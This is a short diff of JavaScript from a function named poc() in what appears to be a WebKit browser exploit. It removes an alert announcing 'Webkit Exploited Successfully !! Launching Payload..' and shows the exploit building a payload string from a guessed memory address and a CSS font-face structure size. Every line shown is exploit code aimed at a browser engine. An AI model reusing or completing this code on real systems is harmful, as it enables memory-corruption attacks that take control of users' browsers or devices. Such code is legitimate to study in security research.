@@ -117,9 +117,7 @@ function poc() {
 
     }
     while (guessed_addr === null);
-	//alert("GUESSED FONT: "+guessed_font+"\nGUESSED ADDR: "+guessed_addr+"\nGUF Val: "+guf+"\nLoop Count: "+round);
-	alert("Webkit Exploited Successfully !! Launching Payload..");
-    var p_s = '';
+	var p_s = '';
     p_s += ptrToString(26);
     p_s += ptrToString(guessed_addr);
     p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
